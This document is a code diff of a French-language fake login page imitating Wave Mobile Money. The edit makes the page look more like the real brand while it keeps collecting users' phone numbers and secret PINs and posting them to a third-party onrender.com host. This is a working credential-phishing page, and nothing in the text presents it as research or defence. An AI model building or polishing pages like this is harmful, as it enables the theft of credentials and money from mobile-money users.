@@ -1,114 +1,120 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion - Wave Mobile Money</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wave Mobile Money – Connexion</title>
 
-  <style>
+<style>
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #46C5F3; /* Bleu clair Wave */
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        background-color: #ffffff; /* page blanche */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
     }
 
-    .login-box {
-      background-color: #87D9F8; /* Cadre bleu clair */
-      width: 350px;
-      padding: 30px;
-      border-radius: 18px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-      text-align: center;
+    .card {
+        background-color: #00A8E1;   /* BLEU WAVE */
+        width: 300px;         /* réduit de 360px à 300px */
+        padding: 25px;        /* réduit de 35px à 25px */
+        border-radius: 18px;
+        box-shadow: 0 4px 30px rgba(0,0,0,0.15);
+        text-align: center;
     }
 
     .logo {
-      width: 130px;
-      margin-bottom: 10px;
+        margin-bottom: 20px; /* réduit légèrement */
     }
 
-    h2 {
-      font-size: 22px;
-      margin: 0;
-      font-weight: bold;
+    .logo img {
+        width: 80px;
+        height: 80px;
+        object-fit: contain;
+    }
+
+    h1 {
+        color: white;
+        font-size: 26px;
+        margin-bottom: 5px;
+        font-weight: bold;
     }
 
     h3 {
-      margin-top: 5px;
-      margin-bottom: 25px;
-      font-weight: normal;
-      color: #003087;
+        color: white;
+        font-size: 18px;
+        margin-top: 0;
+        margin-bottom: 20px; /* réduit légèrement */
+        opacity: 0.95;
     }
 
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 12px;
-      border: 1px solid #d1d1d1;
-      font-size: 15px;
-      box-sizing: border-box;
+    label {
+        color: white;
+        font-weight: 500;
+        font-size: 15px;
+        margin-bottom: 5px;
+        display: block;
+        text-align: left;
     }
 
-    button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 10px;
-      background-color: #003087; /* BLEU OFFICIEL WAVE */
-      color: white;
-      border: none;
-      border-radius: 25px; /* Style arrondi comme Wave */
-      font-size: 16px;
-      cursor: pointer;
-      font-weight: bold;
+    .input-box {
+        width: 100%;
+        background: white;
+        padding: 14px;
+        border-radius: 12px;
+        border: none;
+        font-size: 16px;
+        margin-bottom: 18px;
+        outline: none;
+        box-sizing: border-box;
     }
 
-    button:hover {
-      background-color: #00246a;
+    .btn {
+        width: 100%;
+        padding: 14px;
+        background: white;
+        border: none;
+        border-radius: 12px;
+        color: #00A8E1;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 5px;
     }
 
-    .footer-info {
-      margin-top: 20px;
-      font-size: 12px;
-      color: white;
+    .btn:hover {
+        opacity: 0.9;
     }
 
-    .footer-info a {
-      color: white;
-      text-decoration: none;
-      margin: 0 3px;
-    }
-
-    .footer-info a:hover {
-      text-decoration: underline;
-    }
-  </style>
-
+</style>
 </head>
+
 <body>
 
-  <div class="login-box">
-    <img src="pingouin.png" class="logo" alt="Logo Wave">
+<div class="card">
 
-    <h2>Connexion</h2>
+    <!-- Logo Wave officiel -->
+    <div class="logo">
+         <img src="pingouin.png" class="logo" alt="Logo Wave">
+    </div>
+
+    <h1>Connexion</h1>
     <h3>Wave Mobile Money</h3>
 
     <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
-      <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
-      <input type="password" name="pin" placeholder="Code secret" required>
-      <button type="submit">Connexion</button>
+
+        <label>Numéro de téléphone</label>
+        <input class="input-box" type="tel" name="phone" placeholder="+221 XX XXX XX XX" required>
+
+        <label>Code secret</label>
+        <input class="input-box" type="password" name="pin" minlength="4" maxlength="6" placeholder="••••••" required>
+
+        <button class="btn" type="submit">Connexion</button>
     </form>
 
-    <div class="footer-info">
-      <a href="#">Conditions</a> • 
-      <a href="#">Vie privée</a> • 
-      <a href="#">Aide</a>
-    </div>
-  </div>
+</div>
 
 </body>
 </html>
